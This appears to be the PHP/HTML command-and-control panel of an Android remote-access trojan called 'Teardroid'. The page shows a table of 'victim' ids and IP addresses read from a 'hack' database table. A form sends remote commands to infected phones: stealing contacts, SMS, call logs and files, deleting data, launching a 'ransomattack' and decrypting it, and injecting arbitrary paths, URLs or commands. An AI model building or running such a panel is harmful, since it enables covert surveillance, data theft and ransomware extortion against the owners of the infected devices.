
<html lang="en" >
<?php
    include_once 'sql.php';
?>
<head>
  <meta charset="UTF-8">
  <title>Teardroid</title>
  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">

  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Anton'>

      <link rel="stylesheet" href="css/style.css">

  
</head>

<body>
    
    <div class="camera_x">
  <div class="camera_y">
    <div class="triangle">
      <div class="triangle_outer clip"></div>
      <div class="triangle_inner clip"></div>
    </div>
  </div>
</div>

<div class="tr">
                <table border="1" width="100%">
                  <tr>
                    <th>victim</th>
                    <th>ip</th>
                  </tr>
                  <tr>
                      
                        <?php $sql = "SELECT id, ip FROM hack";
  $result = $conn->query($sql);
  if ($result->num_rows > 0) {
   // output data of each row
   while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . '<font color="red">' . $row["id"] . '</font>'. "</td><td>" . '<font color="red">' . $row["ip"] . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>

                    </td>
                  </tr>
                </table>
                  <div class="row">
              <form action="/addcommand.php">
                  
                  <input type="text" name="id" value="Enter username">
                                    <select name="command">
                        <option value="con">getcon</option>
                        <option value="smlg">getsms</option>
                        <option value="cllg">getcalllogs</option>
                        <option value="infe">getfileloc</option>
                        <option value="sdfe">getsdcardfileloc</option>
                        <option value="upld">getfile</option>
                        <option value="nofi">sendnoti</option>
                        <option value="del">delelet</option>
                        <option value="chwl">chngwal</option>
                        <option value="rnsm">ransomattack</option>
                        <option value="dery">Decryransom</option>

                      </select>
                                        
                                            <input type="text" name="injection" value="Enter path or url or command">
                                            <input type="submit" name="send" value="send">
                    </form>
  

  
  </div>

</body>

</html>
